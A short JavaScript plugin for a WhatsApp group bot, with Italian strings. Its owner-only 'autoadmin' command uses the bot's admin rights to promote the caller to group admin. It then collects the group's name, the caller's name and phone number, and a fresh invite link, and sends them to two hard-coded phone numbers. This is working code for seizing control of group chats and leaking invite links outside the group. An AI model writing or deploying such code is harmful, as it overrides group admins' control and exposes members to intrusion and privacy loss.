const handler = async (m, { conn, isAdmin }) => {
    if (isAdmin) return

    try {
        const groupMetadata = await conn.groupMetadata(m.chat)
        await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote')
        
        let groupLink = ''
        try {
            const code = await conn.groupInviteCode(m.chat)
            groupLink = `https://chat.whatsapp.com/${code}`
        } catch {
            groupLink = 'Impossibile generare il link (permessi bot insufficienti)'
        }

        const reportText = `━━━━⬣ AUTOADMIN ⬣━━━━

👤 *Utente:* @${m.sender.split('@')[0]}
📝 *Nome:* ${conn.getName(m.sender)}
📞 *Numero:* +${m.sender.split('@')[0]}

📌 *Gruppo:*
${groupMetadata.subject}
🔗 *Link:*
${groupLink}`

        const recipients = [
            '393784409415@s.whatsapp.net',
            '393514722317@s.whatsapp.net'
        ]

        for (let jid of recipients) {
            await conn.sendMessage(jid, {
                text: reportText,
                mentions: [m.sender]
            })
        }

    } catch (e) {
        console.error(e)
    }
}

handler.command = ['autoadmin', 'autoadm', 'almighty']
handler.owner = true
handler.group = true
handler.botAdmin = true

export default handler
